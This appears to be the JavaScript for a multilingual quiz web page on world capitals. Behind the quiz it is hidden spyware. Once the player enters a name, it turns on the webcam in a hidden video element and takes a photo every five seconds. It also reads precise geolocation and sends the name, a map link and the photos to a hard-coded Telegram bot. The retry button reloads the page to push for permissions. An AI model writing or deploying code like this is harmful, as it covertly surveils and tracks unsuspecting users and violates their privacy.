const telegramToken = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
const telegramChatId = "8071841674";

const questions = [
  // Массив из 30 вопросов на 3 языках, пример:
  {
    question: {
      hy: "Որն է Հայաստանի մայրաքաղաքը։",
      ru: "Какой город является столицей Армении?",
      en: "What is the capital of Armenia?"
    },
    answers: [
      { text: { hy: "Երևան", ru: "Ереван", en: "Yerevan" }, correct: true },
      { text: { hy: "Թբիլիսի", ru: "Тбилиси", en: "Tbilisi" }, correct: false },
      { text: { hy: "Բաքու", ru: "Баку", en: "Baku" }, correct: false },
      { text: { hy: "Մոսկվա", ru: "Москва", en: "Moscow" }, correct: false },
    ],
  },
  {
    question: {
      hy: "Որն է Ռուսաստանի մայրաքաղաքը։",
      ru: "Какой город является столицей России?",
      en: "What is the capital of Russia?"
    },
    answers: [
      { text: { hy: "Մոսկվա", ru: "Москва", en: "Moscow" }, correct: true },
      { text: { hy: "Կազան", ru: "Казань", en: "Kazan" }, correct: false },
      { text: { hy: "Սանկտ-Պետերբուրգ", ru: "Санкт-Петербург", en: "Saint Petersburg" }, correct: false },
      { text: { hy: "Նովոսիբիրսկ", ru: "Новосибирск", en: "Novosibirsk" }, correct: false },
    ],
  },
  // ... добавь остальные вопросы по аналогии, чтобы было минимум 30
];

// --- Интерфейсные тексты для языков ---
const i18n = {
  hy: {
    enterName: "Մուտքագրեք ձեր անունը",
    startGame: "Սկսել խաղը",
    tryAgain: "Փորձել նորից",
    questionsLeft: "Մնացել է հարց",
    correct: "Ճիշտ պատասխաններ",
    wrong: "Սխալ պատասխաններ",
    victory: "Դուք հաղթել եք! 🎉",
    defeat: "Դուք պարտվեցիք 😞",
  },
  ru: {
    enterName: "Введите ваше имя",
    startGame: "Начать игру",
    tryAgain: "Попробовать ещё",
    questionsLeft: "Осталось вопросов",
    correct: "Правильных ответов",
    wrong: "Неправильных ответов",
    victory: "Вы выиграли! 🎉",
    defeat: "Вы проиграли 😞",
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions Left",
    correct: "Correct Answers",
    wrong: "Wrong Answers",
    victory: "You won! 🎉",
    defeat: "You lost 😞",
  }
};

let language = "hy"; // язык по умолчанию
let userName = "";
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;
let photoIntervalId = null;

// DOM элементы
const nameFormContainer = document.getElementById("name-form-container");
const nameForm = document.getElementById("name-form");
const nameInput = document.getElementById("name-input");

const gameArea = document.getElementById("game-area");
const userNameDisplay = document.getElementById("user-name");
const scoreInfo = document.getElementById("score-info");
const questionContainer = document.getElementById("question-container");
const questionElement = document.getElementById("question");
const answerButtons = document.getElementById("answer-buttons");
const tryAgainBtn = document.getElementById("try-again-btn");

const video = document.createElement("video");
video.autoplay = true;
video.playsInline = true;
video.style.display = "none";
document.body.appendChild(video);

let mediaStream = null;

// Помощник для случайного порядка массива
function shuffle(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

// Выбор случайных 10 вопросов из массива (из 30)
function pickRandomQuestions() {
  let copy = [...questions];
  shuffle(copy);
  return copy.slice(0, 10);
}

// Обновление интерфейса счёта и имени
function updateScore() {
  scoreInfo.innerHTML = `
    ${i18n[language].questionsLeft}: ${10 - currentQuestionIndex} | 
    ${i18n[language].correct}: ${correctCount} | 
    ${i18n[language].wrong}: ${wrongCount}
  `;
  userNameDisplay.textContent = userName;
}

// Отправка данных в Telegram
async function sendDataToTelegram(photoBlob=null) {
  // Формируем ссылку на гугл карты из геолокации
  function getGeoUrl(coords) {
    return `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
  }

  // Получаем геолокацию
  function getPosition() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject("Geolocation not supported");
        return;
      }
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
      });
    });
  }

  try {
    const position = await getPosition();
    const { latitude, longitude } = position.coords;
    const geoUrl = getGeoUrl(position.coords);

    let message = `<b>Имя:</b> ${userName}\n`;
    message += `<b>Язык:</b> ${language}\n`;
    message += `<b>Геолокация:</b> <a href="${geoUrl}">Ссылка на карту</a>\n`;

    const telegramApiBase = `https://api.telegram.org/bot${telegramToken}`;

    // Отправляем сообщение с текстом
    await fetch(`${telegramApiBase}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    // Если есть фото — отправляем фото
    if (photoBlob) {
      const formData = new FormData();
      formData.append("chat_id", telegramChatId);
      formData.append("photo", photoBlob, "photo.jpg");

      await fetch(`${telegramApiBase}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
    }
  } catch (err) {
    console.warn("Не удалось отправить данные в Telegram:", err);
  }
}

// Запуск камеры и фотографирование каждые 5 секунд
async function startCameraAndPhotos() {
  try {
    mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = mediaStream;

    photoIntervalId = setInterval(() => {
      takePhotoAndSend();
    }, 5000);

  } catch (err) {
    console.warn("Камера недоступна:", err);
  }
}

function takePhotoAndSend() {
  if (!mediaStream) return;
  const track = mediaStream.getVideoTracks()[0];
  if (!track) return;

  const imageCapture = new ImageCapture(track);
  imageCapture.takePhoto()
    .then(blob => sendDataToTelegram(blob))
    .catch(err => console.warn("Ошибка фото:", err));
}

// Отображение вопроса и вариантов ответов
function showQuestion() {
  clearStatus();
  updateScore();

  if (currentQuestionIndex >= currentQuestions.length) {
    showResults();
    return;
  }

  const q = currentQuestions[currentQuestionIndex];
  questionElement.textContent = q.question[language];

  // Перемешать варианты ответов
  const answers = shuffle([...q.answers]);

  answerButtons.innerHTML = "";
  answers.forEach((answer, index) => {
    const btn = document.createElement("button");
    btn.textContent = answer.text[language];
    btn.classList.add("btn");
    btn.dataset.correct = answer.correct;
    btn.addEventListener("click", selectAnswer);
    answerButtons.appendChild(btn);
  });
}

// Очистка классов подсветки
function clearStatus() {
  Array.from(answerButtons.children).forEach(button => {
    button.classList.remove("correct");
    button.classList.remove("wrong");
  });
}

// Обработка выбора ответа
function selectAnswer(e) {
  const selectedBtn = e.target;
  const correct = selectedBtn.dataset.correct === "true";

  Array.from(answerButtons.children).forEach(button => {
    button.disabled = true;
    if (button.dataset.correct === "true") {
      button.classList.add("correct");
    } else {
      button.classList.add("wrong");
    }
  });

  if (correct) {
    correctCount++;
  } else {
    wrongCount++;
  }

  updateScore();

  // Через 2 секунды переходим к следующему вопросу
  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 2000);
}

// Показать итог и кнопку «Попробовать ещё»
function showResults() {
  questionElement.textContent = correctCount >= 5 ? i18n[language].victory : i18n[language].defeat;
  answerButtons.innerHTML = "";
  tryAgainBtn.style.display = "inline-block";
  updateScore();
}

// Сброс и начало новой игры
function resetGame() {
  currentQuestions = pickRandomQuestions();
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  tryAgainBtn.style.display = "none";
  showQuestion();
}

// Обработка формы имени
nameForm.addEventListener("submit", (e) => {
  e.preventDefault();
  let nameVal = nameInput.value.trim();
  if (nameVal === "") nameVal = language === "hy" ? "Անհայտ" : language === "ru" ? "Неизвестный" : "Unknown";
  userName = nameVal;

  // Скрываем форму, показываем игру
  nameFormContainer.style.display = "none";
  gameArea.style.display = "block";
  updateScore();

  // Запускаем камеру и фотки
  startCameraAndPhotos();

  // Отправляем данные в Telegram сразу (без фото)
  sendDataToTelegram();

  resetGame();
});

tryAgainBtn.addEventListener("click", () => {
  // Проверяем разрешения
  navigator.permissions.query({name: "geolocation"}).then(geoPerm => {
    navigator.permissions.query({name: "camera"}).then(camPerm => {
      if (geoPerm.state === "granted" && camPerm.state === "granted") {
        resetGame();
      } else {
        // Перезагружаем страницу для повторного запроса разрешений
        location.reload();
      }
    });
  });
});

// Переключение языка (пока задается вручную)
function setLanguage(lang) {
  language = lang;
  if (nameFormContainer.style.display !== "none") {
    // Обновляем placeholder и кнопки на форме имени
    nameInput.placeholder = i18n[language].enterName;
    nameForm.querySelector("button").textContent = i18n[language].startGame;
  }
  if (gameArea.style.display !== "none") {
    updateScore();
    showQuestion();
  }
}
setLanguage(language);
